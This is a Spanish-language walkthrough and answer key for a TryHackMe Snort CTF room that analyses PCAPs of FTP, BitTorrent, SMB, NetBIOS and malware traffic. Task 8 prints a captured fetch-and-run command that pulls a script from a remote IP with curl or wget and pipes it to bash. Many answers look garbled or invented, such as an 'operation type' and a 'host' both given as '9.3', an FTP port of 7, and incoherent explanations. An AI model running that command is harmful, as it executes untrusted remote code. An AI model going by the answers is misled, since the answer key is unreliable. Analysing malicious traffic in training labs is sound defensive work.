# Snort Challenge - The Basics

| **Dificultad** | Medium |
| **Tipo** | CTF |
| **Slug** | `snortchallenges1` |
| **Link** | [TryHackMe](https://tryhackme.com/room/snortchallenges1) |
| **Sección** | 02 Level Medium |
| **Fuente** | texto oficial THM + anotaciones propias |
| **Componentes** | Snort / PCAP analysis / IDS / rules / traffic analysis / malware |
| **Impacto** | Analizar capturas de red con Snort para identificar tráfico malicioso y construir reglas de detección |

---

**Contexto:** Sala práctica de retos para analizar capturas de red (PCAP) usando Snort: identificar paquetes, servicios FTP, malware, tráfico BitTorrent, SMB y otros indicadores maliciosos.

## Solucionario

### Task 1: First Challenge

**Explicación:**

Primer reto introductorio.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Intro) | `No answer needed` |

### Task 2: Analyzing a PCAP with Snort

**Explicación:**

Análisis de una PCAP: el número total de paquetes es **164**. El paquete sospechoso se origina desde la IP **216.239.59.99**. Los primeros números de secuencia/acknowledgement son `0x2E6B5384` y `0x36C21E28`. El TTL es **128**, la IP de destino es **145.254.160.237** y el número de puerto de destino es **3372**.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Total packets) | `1. 164` |
| 2 | (Source IP) | `2. 216.239.59.99` |
| 3 | (Sequence number) | `3. 0x2E6B5384` |
| 4 | (Ack number) | `4. 0x36C21E28` |
| 5 | (TTL) | `5. 128` |
| 6 | (Destination IP) | `6. 145.254.160.237` |
| 7 | (Destination port) | `7. 3372` |

### Task 3: Analyzing an FTP PCAP

**Explicación:**

Análisis de la PCAP de FTP: el número de paquetes es **307**; el servicio es **Microsoft FTP Service**; un total de **41** paquetes presentan el flag ACK en la cabecera TCP (Previous seq ack). Se detectaron **1** paquetes de tipo "svc" y **42** de "data", y el puerto destino del servicio es el **7**.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Total FTP packets) | `1. 307` |
| 2 | (FTP service banner) | `2. Microsoft FTP Service` |
| 3 | (ACK packets) | `3. 41` |
| 4 | (svc packets) | `4. 1` |
| 5 | (data packets) | `5. 42` |
| 6 | (Destination port) | `6. 7` |

### Task 4: Analyzing a GIF PCAP

**Explicación:**

Análisis de la PCAP con un GIF: el software que genera el GIF es **Adobe ImageReady**, y la firma de cabecera del archivo es **GIF89a**.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Software) | `1. Adobe ImageReady` |
| 2 | (Signature) | `2. GIF89a` |

### Task 5: Analyzing a torrent PCAP

**Explicación:**

Análisis de la PCAP de BitTorrent: se observan **2** paquetes; el protocolo a nivel de aplicación es **bittorrent**; el tipo de contenido es `application/x-bittorrent`; y el tracker que anuncia la descarga es **tracker2.torrentbox.com**.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Packets) | `1. 2` |
| 2 | (Protocol) | `2. bittorrent` |
| 3 | (Content type) | `3. application/x-bittorrent` |
| 4 | (Tracker) | `4. tracker2.torrentbox.com` |

### Task 6: Analyzing a SMB PCAP

**Explicación:**

Análisis de la PCAP de SMB: se identifican **16** archivos (o entradas), **68** peticiones de archivos (Write Request), **87** respuestas, **90** operaciones de escritura, **155** operaciones de mapeo (map request) y **2** paquetes cuya cadena finise termina en **msg**.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Files/entries) | `1. 16` |
| 2 | (Write requests) | `2. 68` |
| 3 | (Responses) | `3. 87` |
| 4 | (Write operations) | `4. 90` |
| 5 | (Map requests) | `5. 155` |
| 6 | (Packets ending in msg) | `6. 2` |
| 7 | (String) | `7. msg` |

### Task 7: Analyzing a Netbios PCAP

**Explicación:**

Análisis de la PCAP de NetBIOS: el número de puerto destino del servicio es **25154**; se ven **12** paquetes con el flag del servicio; el recurso compartido es `\\192.168.116.138\IPC$`; y el tipo de operación es **9.3**.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Destination port) | `1. 25154` |
| 2 | (Service packets) | `2. 12` |
| 3 | (Share) | `3. \\192.168.116.138\IPC$` |
| 4 | (Operation type) | `4. 9.3` |

### Task 8: Analyzing a Malware PCAP

**Explicación:**

Análisis de la PCAP de malware: el shellcode codificado ocupa **26** bytes en total; el tamaño del encabezado de la respuesta HTTP es **4**; la longitud del contenido es **210037**; se identifican **41** paquetes con el flag ACK; el contenido está codificado en **Base64**; el número de paquetes con destino al puerto 80 es **62808**; la línea de comando ejecutada es:

```
(curl -s 45.155.205.233:5874/162.0.228.253:80||wget -q -O- 45.155.205.233:5874/162.0.228.253:80)|bash
```

El host de destino (o tipo de operación) es **9.3**.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Shellcode size) | `1. 26` |
| 2 | (HTTP response header size) | `2. 4` |
| 3 | (Content length) | `3. 210037` |
| 4 | (ACK packets) | `4. 41` |
| 5 | (Encoding) | `5. Base64` |
| 6 | (Packets to port 80) | `6. 62808` |
| 7 | (Command line) | `7. (curl -s 45.155.205.233:5874/162.0.228.253:80\|\|wget -q -O- 45.155.205.233:5874/162.0.228.253:80)\|bash` |
| 8 | (Host/operation) | `8. 9.3` |

### Task 9: Conclusion

**Explicación:**

Cierre de la sala de retos de Snort.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | (Conclusion) | `No answer needed` |

---

**Metodología:**

1. Abrir la PCAP en Wireshark/Snort y contabilizar paquetes totales e indicadores de cabecera (TTL, seq/ack, IPs, puertos).
2. Para FTP, contar paquetes por tipo de servicio y puertos de destino.
3. Inspeccionar firmas de archivo (GIF89a, Adobe ImageReady) y protocolos (BitTorrent, SMB, NetBIOS).
4. Para malware, decodificar el contenido (Base64) y extraer la línea de comando y el servidor C2.

**Learning chain:** PCAP -> packet count -> header flags -> FTP service -> signatures -> BitTorrent tracker -> SMB/NetBIOS -> Base64 shellcode -> C2 command

**Lección:** *La inspección sistemática de cabeceras, firmas y protocolos en una PCAP con Snort permite reconstruir el tráfico malicioso y extraer el comando C2 exacto.*

**MITRE ATT&CK:** T1071 (Application Layer Protocol) · T1566 (Phishing) · T1041 (Exfiltration Over C2 Channel) · T1059 (Command and Scripting Interpreter)

**Fuente:** [TryHackMe - Snort Challenge - The Basics](https://tryhackme.com/room/snortchallenges1)
